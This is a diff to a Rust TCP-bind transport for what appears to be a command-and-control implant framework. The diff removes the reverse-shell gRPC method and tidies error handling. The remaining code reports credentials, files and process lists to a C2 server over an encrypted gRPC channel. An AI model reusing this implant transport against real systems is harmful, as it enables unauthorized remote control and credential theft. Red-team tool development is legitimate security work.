@@ -18,7 +18,6 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 /// Cached TCP listener + gRPC channel, keyed by bind address.
@@ -131,10 +130,7 @@ impl Transport for TcpBindTransport {
                             Err(e) => {
                                 #[cfg(feature = "print_debug")]
                                 log::error!("[tcp-bind] connector: accept error: {}", e);
-                                Err(std::io::Error::new(
-                                    std::io::ErrorKind::Other,
-                                    e.to_string(),
-                                ))
+                                Err(std::io::Error::other(e.to_string()))
                             }
                         }
                     } else {
@@ -223,29 +219,6 @@ impl Transport for TcpBindTransport {
         Ok(resp.into_inner())
     }
 
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
-        let resp = self.reverse_shell_impl(req_stream).await?;
-        let mut resp_stream = resp.into_inner();
-
-        tokio::spawn(async move {
-            while let Some(msg) = match resp_stream.message().await {
-                Ok(m) => m,
-                Err(_) => None,
-            } {
-                if tx.send(msg).await.is_err() {
-                    return;
-                }
-            }
-        });
-
-        Ok(())
-    }
-
     async fn create_portal(
         &mut self,
         rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
@@ -256,10 +229,7 @@ impl Transport for TcpBindTransport {
         let mut resp_stream = resp.into_inner();
 
         tokio::spawn(async move {
-            while let Some(msg) = match resp_stream.message().await {
-                Ok(m) => m,
-                Err(_) => None,
-            } {
+            while let Some(msg) = resp_stream.message().await.unwrap_or_default() {
                 if tx.send(msg).await.is_err() {
                     return;
                 }
@@ -409,26 +379,6 @@ impl TcpBindTransport {
         req.extensions_mut()
             .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
         self.grpc.as_mut().unwrap().unary(req, path, codec).await
-    }
-
-    async fn reverse_shell_impl(
-        &mut self,
-        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
-    ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
-        tonic::Status,
-    > {
-        self.check_ready().await?;
-        let codec = pb::xchacha::ChachaCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
-        let mut req = request.into_streaming_request();
-        req.extensions_mut()
-            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
-        self.grpc
-            .as_mut()
-            .unwrap()
-            .streaming(req, path, codec)
-            .await
     }
 
     async fn create_portal_impl(
